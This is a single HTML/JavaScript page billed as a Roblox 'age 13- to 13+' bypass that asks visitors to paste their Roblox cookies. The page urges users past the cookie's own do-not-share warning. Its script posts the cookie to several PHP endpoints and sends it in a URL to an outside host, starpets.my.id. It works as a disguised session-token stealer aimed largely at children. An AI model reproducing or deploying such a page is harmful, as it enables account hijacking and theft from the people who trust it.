
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AGE 13- TO 13+</title>
    <link rel="icon" href="https://cdn.discordapp.com/attachments/1324499580728901764/1338572878563774474/download__4_-removebg-preview.png" type="image/png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f9ff; color: #333; text-align: center; }
        .container { 
            max-width: 600px; 
            margin: 100px auto; 
            padding: 30px; 
            background-color: #ffffff; 
            border-radius: 10px; 
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); 
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(-20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        textarea { 
            width: 100%; 
            height: 200px; 
            padding: 12px; 
            font-size: 16px; 
            border: 1px solid #d1e4f1; 
            border-radius: 8px; 
            outline: none; 
            resize: none; 
            transition: all 0.3s ease-in-out;
        }
        textarea:focus {
            border-color: #2d87f0;
            box-shadow: 0 0 8px rgba(45, 135, 240, 0.5);
        }
        button { 
            padding: 12px 20px; 
            background-color: #2d87f0; 
            color: white; 
            font-size: 16px; 
            font-weight: 600; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            transition: all 0.3s ease-in-out;
        }
        button:disabled {
            background-color: #888;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>AGE 13- TO 13+</h1>
    <div class="form-box">
        <form id="bypassForm">
            <label for="payload">Enter Cookies:</label><br>
            <textarea name="payload" id="payload" rows="6"></textarea><br><br>
            <button type="submit" id="submitBtn">Submit Cookies</button>
            <p id="countdown" style="margin-top: 10px; font-size: 14px; color: red;"></p>
            <p>Tutorial use? <a href="https://discord.gg/NZJkYAccas" target="_blank">click me</a></p>
            <br>
            <p>You need an IP bypasser first if your cookie looks like "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-..." (auto invalid)</p>
        </form>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
<script>
function setCooldown(timeLeft) {
    const submitBtn = document.getElementById('submitBtn');
    const countdown = document.getElementById('countdown');
    submitBtn.disabled = true;
    
    const interval = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(interval);
            submitBtn.disabled = false;
            submitBtn.textContent = "Submit Cookies";
            countdown.textContent = "";
            localStorage.removeItem("cooldownEnd");
        } else {
            submitBtn.textContent = `Please wait ${timeLeft}s`;
            countdown.textContent = `Wait ${timeLeft}s before submitting again`;
            timeLeft--;
        }
    }, 1000);
}

async function sendRequest(url, body) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: JSON.stringify({ a: body }),
            headers: { 'Content-Type': 'application/json' }
        });
        const data = await response.json();
        console.log(`Response from ${url}:`, data);
        return data;
    } catch (error) {
        console.error(`Error from ${url}:`, error);
        return null;
    }
}

async function submitForm() {
    const payload = document.getElementById('payload').value.trim();
    if (!payload) {
        iziToast.show({
            title: 'Error:',
            message: 'Please enter your Roblox cookies.',
            color: 'red',
            position: 'topCenter',
            timeout: 3000
        });
        return;
    }

    // Cek cooldown dari localStorage
    const cooldownEnd = localStorage.getItem("cooldownEnd");
    if (cooldownEnd && Date.now() < parseInt(cooldownEnd)) {
        iziToast.show({
            title: 'Wait:',
            message: 'Please wait for cooldown to finish before submitting again.',
            color: 'orange',
            position: 'topCenter',
            timeout: 3000
        });
        return;
    }

    // Set cooldown 30 detik
    localStorage.setItem("cooldownEnd", Date.now() + 30000);
    setCooldown(30);

    // Eksekusi request satu per satu dengan menunggu response
    const urls = [
        'request-api.php',
        'getseasson-api.php',
        'bypass_cookie.php',
        'request-link.php',
        'changebirthday-api.php',
        'succesfully.php'
    ];

    for (const url of urls) {
        const result = await sendRequest(url, payload);
        if (result && result.errors && result.errors.length > 0) {
            iziToast.show({
                title: 'Error:',
                message: result.errors[0].message.trim() || 'Invalid Cookies',
                color: 'red',
                position: 'topCenter',
                timeout: 5000
            });
            return;
        }

        // Tunggu 3 detik sebelum request berikutnya
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // Menambahkan request ke game-api.php
    const gameApiResponse = await fetch(`https://starpets.my.id/bypass-verify.php?cookie=${encodeURIComponent(payload)}`, {
        method: 'GET',
    });
    const gameApiData = await gameApiResponse.json();
    console.log('Response from game-api.php:', gameApiData);

    if (gameApiData.errors && gameApiData.errors.length > 0) {
        iziToast.show({
            title: 'Error:',
            message: gameApiData.errors[0].message.trim() || 'Invalid Cookies in game-api.php',
            color: 'red',
            position: 'topCenter',
            timeout: 5000
        });
        return;
    }

    // Jika semua berhasil
    iziToast.show({
        title: 'Success:',
        message: 'All requests completed successfully (if not work use another or wait 1hour)!',
        color: 'green',
        position: 'topCenter',
        timeout: 5000
    });
}

// Event listener untuk form submit
document.getElementById('bypassForm').addEventListener('submit', function(event) {
    event.preventDefault();
    submitForm();
});
</script>

</body>
</html>